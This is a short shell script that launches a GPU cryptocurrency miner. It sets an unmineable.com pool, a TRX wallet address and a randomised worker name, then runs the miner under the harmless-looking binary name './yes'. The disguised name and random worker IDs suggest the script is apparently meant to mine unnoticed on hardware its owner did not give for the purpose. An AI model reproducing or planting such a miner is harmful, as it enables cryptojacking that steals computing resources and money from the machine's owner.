POOL=rx-us.unmineable.com:3333
WALLET=TRX:TPsHfvbqKR9RQ4ZEnZja4scVvmkE4QE351
GPU=$(nvidia-smi --query-gpu=gpu_name --format=csv > nvidia.txt && echo "$(tail -n +2 "nvidia.txt")" > "nvidia.txt" && str=$(cat nvidia.txt) && echo ${str// /_})
WORKER=$(echo gS782UJT-$(shuf -i 1911-828509 -n 1))
ALGO=wrkzcoin
./yes --pool $POOL --username $WALLET.$WORKER --password x --algorithm $ALGO --disableCPU
